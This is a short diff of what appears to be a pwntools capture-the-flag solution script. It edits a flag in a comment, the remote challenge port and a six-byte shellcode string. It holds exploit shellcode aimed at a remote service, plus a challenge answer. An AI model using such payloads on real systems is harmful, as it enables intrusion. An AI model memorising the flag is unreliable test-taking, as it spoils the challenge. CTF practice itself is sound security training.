@@ -1,13 +1,13 @@
 #!/usr/bin/env python
 from pwn import *
 
-# AD{S0meth1ng_usefu1_0n_7he_st4ck!}
+# AD{S0meth1ng_u5efu1_0n_7he_st4ck!}
 
-host , port = 'ctf.yuawn.idv.tw' , 10110
+host , port = 'ctf.yuawn.idv.tw' , 10104
 y = remote( host , port )
 
 
-sc = 'Z\xe9\xd5\xf5\xdf\xff'
+sc = 'Z\xe9\xe6\xf5\xdf\xff'
 
 print len( sc )
 
